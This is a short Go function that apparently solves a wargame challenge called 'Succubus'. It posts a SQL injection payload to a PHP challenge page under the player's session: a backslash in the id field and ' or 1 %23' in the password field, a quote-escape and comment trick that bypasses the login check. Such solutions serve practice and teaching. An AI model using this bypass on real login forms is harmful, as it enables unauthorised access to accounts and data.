package problem

import(
	"fmt"
	"strings"
)

func Succubus(session string){
	file := "succubus_1e73ac44ec838508bd2b2ce2026af8cf.php"
	
	param := map[string]string{
		"id" : "\\",
		"pw" : " or 1 %23",
	}
	
	contents := connect(file, param, session)
	if strings.Contains(string(contents),"SUCCUBUS Clear!"){
		fmt.Println("SUCCUBUS Clear!")
	}
}